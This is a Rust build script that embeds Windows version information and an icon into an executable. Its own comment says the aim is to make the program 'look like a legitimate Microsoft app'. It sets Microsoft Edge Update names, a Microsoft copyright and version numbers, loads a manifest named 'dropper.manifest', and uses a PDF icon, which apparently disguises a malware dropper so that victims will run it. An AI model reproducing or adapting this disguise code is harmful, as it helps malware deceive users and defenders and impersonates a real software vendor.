//! Build script for Windows resource embedding
//! This embeds version info and icon into the executable

#[cfg(target_os = "windows")]
fn main() {
    if std::env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
        let mut res = winres::WindowsResource::new();

        // Set version information to look like a legitimate Microsoft app
        res.set_manifest_file("dropper.manifest");
        res.set("FileDescription", "Microsoft Edge Update");
        res.set("ProductName", "Microsoft Edge");
        res.set("CompanyName", "Microsoft Corporation");
        res.set(
            "LegalCopyright",
            "© Microsoft Corporation. All rights reserved.",
        );
        res.set("FileVersion", "120.0.2210.133");
        res.set("ProductVersion", "120.0.2210.133");

        // Try to use icon if available
        if std::path::Path::new("pdf_icon.ico").exists() {
            res.set_icon("pdf_icon.ico");
        } else if std::path::Path::new("../pdf_icon.ico").exists() {
            res.set_icon("../pdf_icon.ico");
        }

        res.compile().unwrap_or_else(|e| {
            eprintln!("Warning: Failed to compile Windows resources: {}", e);
        });
    }
}

#[cfg(not(target_os = "windows"))]
fn main() {
    // No resources needed on non-Windows
}
